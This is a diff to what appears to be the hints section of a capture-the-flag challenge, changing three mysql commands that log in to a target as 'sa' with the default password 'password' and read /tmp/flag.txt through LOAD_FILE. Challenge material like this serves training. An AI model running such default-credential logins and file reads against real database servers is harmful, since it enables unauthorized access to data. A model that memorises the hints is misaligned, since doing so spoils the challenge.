@@ -253,7 +253,7 @@ hints:
 
       # Read the flag file (sa has the FILE privilege)
       mysql --ssl-verify-server-cert=0 -h <target> -u sa -p'password' \
-        -e "SELECT LOAD_FILE('/tmp/flag.txt');"
+        -e "SELECT TRIM(LOAD_FILE('/tmp/flag.txt'));"
       ```
 
       You can also read the flag from the seeded table:
@@ -313,7 +313,7 @@ hints:
 
       ```bash
       mysql --ssl-verify-server-cert=0 -u sa -p'password' -h <target> \
-        -e "SELECT LOAD_FILE('/tmp/flag.txt');"
+        -e "SELECT TRIM(LOAD_FILE('/tmp/flag.txt'));"
       ```
 
       Or read the seeded table:
@@ -392,7 +392,7 @@ hints:
 
       ```bash
       mysql --ssl-verify-server-cert=0 -u sa -p'password' -h <target> \
-        -e "SELECT LOAD_FILE('/tmp/flag.txt');"
+        -e "SELECT TRIM(LOAD_FILE('/tmp/flag.txt'));"
       ```
 
       **Expected Output:**
